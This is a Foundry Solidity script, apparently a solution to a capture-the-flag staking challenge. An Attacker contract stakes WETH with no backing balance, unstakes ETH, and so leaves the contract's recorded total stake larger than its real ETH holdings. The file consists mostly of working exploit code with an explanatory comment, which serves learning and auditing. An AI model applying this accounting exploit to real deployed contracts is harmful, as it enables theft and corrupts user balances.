// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Stake} from "../src/Stake.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IWETH is IERC20 {
    function name() external view returns(string memory);
    function totalSupply() external view returns(uint256);
    function approve(address to, uint256 amount) external returns(bool);
    function allowance(address owner, address spender) external view returns(uint256);
}

contract Attacker {
    Stake stake;
    IWETH private weth = IWETH(0xCd8AF4A0F29cF7966C051542905F66F5dca9052f);

    constructor(address _target) {
        stake = Stake(_target);
    }

    function stakeWeth() external {
        weth.approve(address(stake), 3e15);
        stake.StakeWETH(3e15);
    }
}

contract StakeScript is Script {

    Stake private stake = Stake(payable(0xA1ec9455be55D137Da1Dc08C8bBfCb01630c5901));
    IWETH private weth = IWETH(0xCd8AF4A0F29cF7966C051542905F66F5dca9052f);

    /**
     * Solution: in the requirement there are four checks to be met in order to pass the challage.
     * 1. The Stake contract's ETH balance has to be greater than 0.
     * 2. totalStaked must be greater than the Stake contract's ETH balance.
     * 3. You must be a staker.
     * 4. Your staked balance must be 0.
     * 
     * 1. StakeETH() is payable and we can execute it in order to send/stake ethers in the Stake contract
     * 2. We need to stake WETH as it's ERC20 and not ether. This way totalStake > contrat's ETH balace.
     *    But how? Usually WETH contract implements deposit() method, but in this case Stake.WETH hasn't impelemented it.
     *    How I know it? I've used online evm bytecode decoder looking at the ABI in order to figure out the methods implemented.
     *    https://app.dedaub.com/decompile.
     *    Hack: we can just approve as many tokens as we want. This is the tricky part of the challange
     * 3. Since we've already staked ETH and WETH we are already a staker.
     * 4. We execute Stake.Unstake(the total amout we staked (eth + weth))
     * 5. But this way 2. requirement is still not met.
     *    We just need to stake some more WETH from a different account.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        stake.StakeETH{value: 2e15}();
        console.log("================");
        console.log("Stake Contract ETHs", address(stake).balance);
        console.log("TotalStaked", stake.totalStaked());
        console.log("UserStaker", stake.Stakers(msg.sender));
        console.log("Staked Balance", stake.UserStake(msg.sender));

        weth.approve(address(stake), 2e15);

        stake.StakeWETH(2e15);
        stake.Unstake(4e15);
        console.log("================");
        console.log("Stake Contract ETHs", address(stake).balance);
        console.log("TotalStaked", stake.totalStaked());
        console.log("UserStaker", stake.Stakers(msg.sender));
        console.log("Staked Balance", stake.UserStake(msg.sender));

        Attacker attacker = new Attacker(address(stake));
        attacker.stakeWeth();
        console.log("================");
        console.log("Stake Contract ETHs", address(stake).balance);
        console.log("TotalStaked", stake.totalStaked());
        console.log("UserStaker", stake.Stakers(msg.sender));
        console.log("Staked Balance", stake.UserStake(msg.sender));
        
        vm.stopBroadcast();
    }
}

